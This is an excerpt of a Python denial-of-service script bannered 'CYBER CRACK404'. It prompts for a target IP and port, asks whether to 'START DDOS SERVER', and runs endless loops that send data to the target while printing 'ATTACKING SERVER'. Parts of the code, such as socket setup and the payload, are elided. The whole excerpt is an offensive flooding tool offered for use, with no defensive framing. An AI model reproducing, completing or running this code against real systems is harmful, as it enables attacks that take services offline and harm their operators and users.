...
print("\033[92m========= CYBER CRACK404 =========") 
print("\033[92m>> Author : CC & ALL TEAM") 
print("\033[92m>>> Coded : ALL TEAM") 
print("\033[92m>>>> CYBER CRACK 404")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("START DDOS SERVER ?[y/n]:"))
...
def run6():
    ...
    while True:
        try:
            ...
            for x in range(times):
                s.send(data)
            print(i +"ATTACKING SERVER IP %s PORT SERVER : %s"%(ip, port))
        except:
            s.close()
            print("SERVER IS OFFLINE")
...
def run7():
    ...
    while True:
        try:
            ...
            for x in range(times):
                s.send(data)
            print(i +"ATTACKING SERVER IP %s SERVER PORT : %s"%(ip, port))
        except:
            s.close()
            print("SERVER IS OFFLINE")
